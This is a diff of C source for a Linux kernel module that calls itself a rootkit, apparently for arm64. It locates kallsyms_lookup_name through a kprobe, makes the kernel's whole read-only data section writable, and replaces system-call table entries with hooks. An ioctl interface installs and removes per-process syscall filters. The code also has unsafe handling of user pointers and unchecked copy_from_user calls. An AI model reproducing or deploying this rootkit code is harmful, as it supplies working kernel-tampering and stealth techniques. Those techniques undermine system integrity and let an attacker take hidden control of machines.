@@ -24,7 +24,7 @@ void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt,
                             phys_addr_t size, pgprot_t prot);
 
 int is_hidden = 0;
-struct filter_info *filter_list;
+struct filter_info filter_list;
 syscall_fn_t custom_handlers[NR_syscalls] = {0};
 int total_references[NR_syscalls] = {0};
 
@@ -34,19 +34,15 @@ static struct kprobe kp = {
     .symbol_name = "kallsyms_lookup_name",
 };
 
-// store original syscall handler with type sys_call_t
-typedef asmlinkage long (*sys_call_t)(const struct pt_regs *);
-
 MODULE_AUTHOR("FOOBAR");
 MODULE_DESCRIPTION("FOOBAR");
 MODULE_LICENSE("Dual MIT/GPL");
 MODULE_VERSION("0.1");
 
-static asmlinkage long my_sys_read(unsigned int fd, char __user *buf,
-                                   size_t count) {
+static asmlinkage long my_sys_read(const struct pt_regs *regs) {
   pr_info("my_sys_read\n");
   struct filter_info *pos;
-  list_for_each_entry(pos, &filter_list->list, list) {
+  list_for_each_entry(pos, &filter_list.list, list) {
     if (strcmp(pos->comm, current->comm) == 0 && pos->syscall_nr == __NR_read) {
       pr_info("Filtering read syscall for process %s\n", pos->comm);
       return -EPERM; // ????
@@ -54,15 +50,27 @@ static asmlinkage long my_sys_read(unsigned int fd, char __user *buf,
   }
 
   if (total_references[__NR_read] == 0) {
-    sys_call_table_p[__NR_read](fd, buf, count);
+    return sys_call_table_p[__NR_read](regs);
   } else {
-    list_for_each_entry(pos, &filter_list->list, list) {
+    list_for_each_entry(pos, &filter_list.list, list) {
       if (pos->syscall_nr == __NR_read) {
         syscall_fn_t orig_syscall = (syscall_fn_t)pos->orig_handler_addr;
-        orig_syscall(fd, buf, count);
+        return orig_syscall(regs);
       }
     }
   }
+  return 0; // should never reach here
+}
+
+void mark_rodata_wr(void) {
+  unsigned long section_size;
+  unsigned long start_rodata =
+      (unsigned long)(kallsyms_lookup_name_fn("__start_rodata"));
+  unsigned long init_begin =
+      (unsigned long)(kallsyms_lookup_name_fn("__init_begin"));
+  section_size = init_begin - start_rodata;
+  update_mapping_prot(__pa_symbol(start_rodata), start_rodata, section_size,
+                      PAGE_KERNEL);
 }
 
 static int rootkit_open(struct inode *inode, struct file *filp) {
@@ -114,10 +122,10 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
       }
     }
     break;
-  case IOCTL_ADD_FILTER:
+  case IOCTL_ADD_FILTER: {
     // copy from user space
     struct filter_info *filter =
-        kmalloc(sizeof(struct filter_info), GFP_KERNEL);
+        (struct filter_info *)kmalloc(sizeof(struct filter_info), GFP_KERNEL);
     copy_from_user(filter, (struct filter_info *)arg,
                    sizeof(struct filter_info));
 
@@ -131,8 +139,9 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
       // use current process if name not specified
     }
 
-    filter_info *pos;
-    list_for_each_entry(pos, &filter_list->list, list) {
+    struct filter_info *pos;
+
+    list_for_each_entry(pos, &filter_list.list, list) {
       if (strcmp(pos->comm, filter->comm) == 0) {
         // process already has a filter
         return -EEXIST;
@@ -140,40 +149,43 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
     }
 
     if (total_references[filter->syscall_nr] > 0) {
-      list_for_each_entry(pos, &filter_list->list, list) {
+      list_for_each_entry(pos, &filter_list.list, list) {
         if (pos->syscall_nr == filter->syscall_nr) {
           // syscall already has a filter owned by other process
           // copy the reference
-          filter->orig_syscall = pos->orig_syscall;
+          filter->orig_handler_addr = pos->orig_handler_addr;
           break;
         }
       }
     } else {
       // syscall hasn't been filtered yet
-      filter->orig_syscall = sys_call_table_p[filter->syscall_nr];
+      filter->orig_handler_addr =
+          (unsigned long)sys_call_table_p[filter->syscall_nr];
       sys_call_table_p[filter->syscall_nr] =
           custom_handlers[filter->syscall_nr];
     }
 
     total_references[filter->syscall_nr] += 1;
-    list_add(&filter->list, &filter_list->list);
+    list_add(&filter->list, &filter_list.list);
     break;
-
-  case IOCTL_REMOVE_FILTER:
+  }
+  case IOCTL_REMOVE_FILTER: {
     struct filter_info *filter = (struct filter_info *)arg;
     struct filter_info *pos;
-    list_for_each_entry(pos, &filter_list->list, list) {
+    list_for_each_entry(pos, &filter_list.list, list) {
       if (strcmp(pos->comm, filter->comm) == 0 &&
           pos->syscall_nr == filter->syscall_nr) {
         total_references[pos->syscall_nr] -= 1;
         if (total_references[pos->syscall_nr] == 0)
-          sys_call_table_p[pos->syscall_nr] = pos->orig_syscall;
+          sys_call_table_p[pos->syscall_nr] =
+              (syscall_fn_t)pos->orig_handler_addr;
         list_del(&pos->list);
         kfree(pos);
         break;
       }
     }
     break;
+  }
   default:
     ret = -EINVAL;
   }
@@ -212,17 +224,14 @@ static int __init rootkit_init(void) {
   unregister_kprobe(&kp);
 
   sys_call_table_p = (syscall_fn_t *)kallsyms_lookup_name_fn("sys_call_table");
-  update_mapping_prot = (void *)kallsyms_lookup_name_fn("update_mapping_prot");
+  // TODO: check type of update_mapping_prot
   pr_info("sys_call_table at %p\n", sys_call_table_p);
 
-  // change to writable
-  update_mapping_prot((phys_addr_t)sys_call_table_p,
-                      (unsigned long)sys_call_table_p,
-                      sizeof(syscall_fn_t) * NR_syscalls, PAGE_KERNEL);
+  mark_rodata_wr();
 
   // list of all filters by process
-  filter_list = kmalloc(sizeof(filter_info), GFP_KERNEL);
-  filter_list->syscall_nr = -1;
+  // filter_list = kmalloc(sizeof(struct filter_info), GFP_KERNEL);
+  filter_list.syscall_nr = -1;
   INIT_LIST_HEAD(&filter_list.list);
 
   // hook syscalls
